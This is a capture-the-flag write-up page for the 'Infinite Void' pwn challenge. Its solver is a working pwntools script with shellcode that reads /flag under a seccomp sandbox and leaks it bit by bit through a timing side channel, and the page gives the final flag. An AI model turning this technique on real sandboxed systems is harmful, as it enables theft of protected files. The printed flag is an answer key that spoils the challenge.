@@ -1,0 +1,81 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#0b0b0e"><title>Infinite Void · Pwn writeup — r3t0x</title><meta name="description" content="Unlimited knowledge is included. Exporting it requires the premium plan, which your team apparently could not afford."><link rel="canonical" href="https://ghaith-amdouni.github.io/challenge/securinets-enit-friendly-2026/pwn/infinite-void-free-tier/"><meta property="og:type" content="article"><meta property="og:title" content="Infinite Void · Pwn writeup — r3t0x"><meta property="og:description" content="Unlimited knowledge is included. Exporting it requires the premium plan, which your team apparently could not afford."><meta property="og:url" content="https://ghaith-amdouni.github.io/challenge/securinets-enit-friendly-2026/pwn/infinite-void-free-tier/"><meta property="og:image" content="https://ghaith-amdouni.github.io/static/img/social-card.png"><meta name="twitter:card" content="summary_large_image"><link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="r3t0x journal" href="/feed.xml"><link rel="stylesheet" href="/static/css/site.css?v=6d84193b4c6e"><link rel="stylesheet" href="/static/css/akatsuki.css?v=6d84193b4c6e"><script src="/static/js/site.js?v=6d84193b4c6e" defer></script></head><body class="veil-open">
+  <a class="skip" href="#main">Skip to content</a><div class="reading-progress" aria-hidden="true"></div>
+  <div class="systembar"><div><span class="arch-mini" aria-hidden="true">Λ</span> archlinux <span class="bar-sep">/</span> r3t0x@portfolio <span class="system-workspaces" aria-hidden="true"><b>01</b> 02 03</span></div><div><span class="online-dot"></span> ALL SYSTEMS NOMINAL <span class="bar-sep">/</span> <time id="clock">UTC</time></div></div>
+  <header class="site-header"><a class="brand" href="/" aria-label="r3t0x home"><img class="brand-eye" src="/static/img/mangekyou.png" alt="" width="32" height="32"><span>r3t0x<span class="muted">@arch</span></span></a><nav aria-label="Main navigation"><a href="/" >~/home</a><a href="/blog/" aria-current="page">~/archive</a><a href="/projects/" >~/projects</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>CV ↓</a></nav><button class="search-trigger" data-open-search aria-label="Search site"><span>⌕</span><kbd>Ctrl K</kbd></button></header>
+  <div class="archive-transition" id="archive-transition" aria-hidden="true"><div class="route-eyelid route-eyelid-top"></div><div class="route-eyelid route-eyelid-bottom"></div><div class="vault-coordinates"><span>00:00:01</span><span>0x00401337</span></div><div class="vault-eye"><span class="vault-symbol"></span><span class="vault-reticle"></span><i></i><i></i><i></i></div><div class="vault-caption"><p><small>TSUKUYOMI ROUTE SHIFT</small><b id="transition-label">ENTERING THE MEMORY VAULT</b><span id="transition-address">~/archive</span></p></div></div>
+  <div class="ambient-clouds" aria-hidden="true"><svg class="akatsuki-cloud" viewBox="0 0 160 100" aria-hidden="true"><path d="M34 78C9 80 6 52 28 47C20 24 47 13 63 28C75 3 112 12 113 37C138 27 158 51 143 69C135 79 119 80 108 76C104 91 81 91 73 79C62 89 42 91 34 78Z"/><path class="cloud-whorl" d="M28 47C52 41 68 52 62 65C57 76 39 72 41 62M113 37C93 36 85 47 90 59"/></svg><svg class="akatsuki-cloud" viewBox="0 0 160 100" aria-hidden="true"><path d="M34 78C9 80 6 52 28 47C20 24 47 13 63 28C75 3 112 12 113 37C138 27 158 51 143 69C135 79 119 80 108 76C104 91 81 91 73 79C62 89 42 91 34 78Z"/><path class="cloud-whorl" d="M28 47C52 41 68 52 62 65C57 76 39 72 41 62M113 37C93 36 85 47 90 59"/></svg></div><div class="scroll-address" aria-hidden="true"><b>RIP</b><span id="scroll-address">0x00000000</span><i><em></em></i><small>PTR</small></div><div class="route-veil" id="route-veil" aria-hidden="true"><div class="veil-lid veil-lid-top"></div><div class="veil-lid veil-lid-bottom"></div><div class="veil-eye"><svg viewBox="0 0 200 200"><defs><clipPath id="veilClip"><circle cx="100" cy="100" r="98"/></clipPath></defs><circle cx="100" cy="100" r="94" fill="var(--red)" stroke="#000" stroke-width="10"/><g class="veil-base"><circle cx="100" cy="100" r="90" fill="var(--red)"/><circle cx="100" cy="100" r="16" fill="#000"/><circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/><g class="veil-tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g><g class="veil-tomoe" style="transform:rotate(120deg)"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g><g class="veil-tomoe" style="transform:rotate(240deg)"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g></g><image class="veil-mangekyo" href="/static/img/mangekyou.png" x="0" y="0" width="200" height="200" clip-path="url(#veilClip)"/></svg></div></div><div class="kamui-veil" id="kamui-veil" aria-hidden="true"></div><main id="main"><article class="wrap article-page writeup-page">
+    <a class="text-link" href="/blog/?collection=Securinets+ENIT+Friendly+2026&amp;category=Pwn">← Back to archive · Pwn</a>
+    <header class="article-heading"><p class="eyebrow">Securinets ENIT Friendly 2026 <span>/</span> Pwn WRITEUP</p><h1>Infinite Void</h1><p>Unlimited knowledge is included. Exporting it requires the premium plan, which your team apparently could not afford.</p>
+      <div class="article-author"><img src="/static/img/ghaith.webp" alt="" width="44" height="44"><span><strong>r3t0x</strong><small>2026-10-15 · 1000 points · hard</small></span><a class="button" href="#solver">Jump to solver ↓</a></div>
+    </header>
+    <div class="writeup-facts" aria-label="Challenge metadata"><span><small>EVENT</small>Securinets ENIT Friendly 2026</span><span><small>CATEGORY</small>Pwn</span><span><small>DIFFICULTY</small>hard</span><span><small>POINTS</small>1000</span></div>
+    <div class="writeup-tags"><span>seccomp</span><span>blind-exfiltration</span><span>side-channel</span></div>
+    <div class="article-layout">
+      <div class="prose writeup-prose"><h2 id="walkthrough">Walkthrough</h2><h3 id="solution">Solution</h3>
+<p>The seccomp policy allows <code>openat</code>, <code>read</code>, and exit calls, but not <code>write</code>, so the flag cannot be returned directly. Shellcode can still open and read <code>/flag</code>, compare one chosen byte with a guess, and conditionally block in an allowed read from standard input.</p>
+<p>An immediate exit means the secret byte is at most the guess; a connection that remains alive means it is greater. Binary-search printable ASCII with this one-bit oracle for each position, starting from the known <code>SecurinetsENIT{</code> prefix, until the closing brace is recovered.</p><h2 id="solver">Reference solver</h2><p>The reference solver supplied with the writeup:</p><pre><code class="language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+context.arch = <span class="hljs-string">&quot;amd64&quot;</span>
+known = <span class="hljs-string">b&quot;SecurinetsENIT{&quot;</span>
+
+<span class="hljs-keyword">while</span> known[-<span class="hljs-number">1</span>:] != <span class="hljs-string">b&quot;}&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(known) &lt; <span class="hljs-number">80</span>:
+    low, high = <span class="hljs-number">32</span>, <span class="hljs-number">126</span>
+
+    <span class="hljs-keyword">while</span> low &lt; high:
+        guess = (low + high) // <span class="hljs-number">2</span>
+        code = asm(<span class="hljs-string">f&quot;&quot;&quot;
+            sub rsp, 0x100
+            mov rbx, 0x67616c662f
+            mov qword ptr [rsp], rbx
+            mov eax, 257
+            mov rdi, -100
+            mov rsi, rsp
+            xor edx, edx
+            xor r10d, r10d
+            syscall
+            mov edi, eax
+            lea rsi, [rsp + 0x20]
+            mov edx, 0x80
+            xor eax, eax
+            syscall
+            movzx eax, byte ptr [rsp + 0x20 + <span class="hljs-subst">{<span class="hljs-built_in">len</span>(known)}</span>]
+            cmp eax, <span class="hljs-subst">{guess}</span>
+            jbe done
+            xor eax, eax
+            xor edi, edi
+            lea rsi, [rsp + 0xa0]
+            mov edx, 1
+            syscall
+        done:
+            mov eax, 60
+            xor edi, edi
+            syscall
+        &quot;&quot;&quot;</span>)
+
+        p = remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1351</span>, level=<span class="hljs-string">&quot;error&quot;</span>)
+        p.sendafter(<span class="hljs-string">b&quot;Technique: &quot;</span>, code)
+        p.recvuntil(<span class="hljs-string">b&quot;Technique accepted.\n&quot;</span>)
+
+        <span class="hljs-keyword">try</span>:
+            p.recv(<span class="hljs-number">1</span>, timeout=<span class="hljs-number">0.2</span>)
+        <span class="hljs-keyword">except</span> EOFError:
+            <span class="hljs-keyword">pass</span>
+
+        alive = p.connected(<span class="hljs-string">&quot;recv&quot;</span>)
+
+        <span class="hljs-keyword">if</span> alive:
+            low = guess + <span class="hljs-number">1</span>
+            p.send(<span class="hljs-string">b&quot;X&quot;</span>)
+        <span class="hljs-keyword">else</span>:
+            high = guess
+
+        p.close()
+
+    known += <span class="hljs-built_in">bytes</span>([low])
+    <span class="hljs-built_in">print</span>(known.decode(), flush=<span class="hljs-literal">True</span>)</code></pre><h2 id="flag">Flag</h2><pre class="flag-output"><code>SecurinetsENIT{1nf1n1t3_v01d_h4s_0n3_b1t_0f_b4ndw1dth}</code></pre>
+      <div class="article-end"><span>Published 2026-10-15 · by r3t0x</span><a class="text-link" href="/blog/?collection=Securinets+ENIT+Friendly+2026&amp;category=Pwn">← Back to archive · Pwn</a></div></div>
+    </div>
+  </article></main>
+  <footer class="site-footer"><div class="footer-top"><a class="brand" href="/"><img class="brand-eye" src="/static/img/mangekyou.png" alt="" width="32" height="32"><span>r3t0x<span class="muted">@arch</span></span></a><p>Always curious. Always one layer deeper.</p><a href="#main" class="text-link">Back to top ↑</a></div><div class="footer-bottom"><span>© 2026 Ghaith Amdouni <span class="red">·</span> Made with curiosity & caffeine.</span><div><a href="/projects/">Projects ↗</a><a href="https://github.com/Ghaith-amdouni">GitHub ↗</a><a href="https://www.linkedin.com/in/amdouni-ghaith">LinkedIn ↗</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>Résumé ↗</a><a href="/feed.xml">RSS ↗</a><button id="motion-toggle" aria-pressed="false">Motion: on</button></div></div></footer>
+  <dialog id="search-dialog" class="search-vault" aria-labelledby="search-title"><div class="search-vault-mark" aria-hidden="true"><span></span><small>眼 // TRACE</small></div><div class="dialog-top"><div><span class="dialog-address">0xSEARCH_INDEX</span><h2 id="search-title">Trace a memory.</h2></div><button data-close-dialog aria-label="Close search">ESC</button></div><label for="site-search" class="search-command"><span aria-hidden="true">❯</span><span class="sr-only">Search challenges, projects, and pages</span><input id="site-search" type="search" placeholder="type a challenge, project, primitive…" autocomplete="off" spellcheck="false"></label><div class="search-scopes" role="group" aria-label="Search scope"><button type="button" data-search-scope="All" aria-pressed="true">ALL MEMORY</button><button type="button" data-search-scope="Challenge" aria-pressed="false">CHALLENGES</button><button type="button" data-search-scope="Project" aria-pressed="false">PROJECTS</button></div><div class="search-readout"><span><i></i> INDEX ONLINE</span><b id="search-count">0 addresses</b></div><div id="search-results" aria-live="polite"></div><div class="dialog-bottom"><span>↑↓ TRACE</span><span>ENTER OPEN</span><span>ESC DISMISS</span></div></dialog>
+  <div class="toast" id="toast" role="status"></div></body></html>
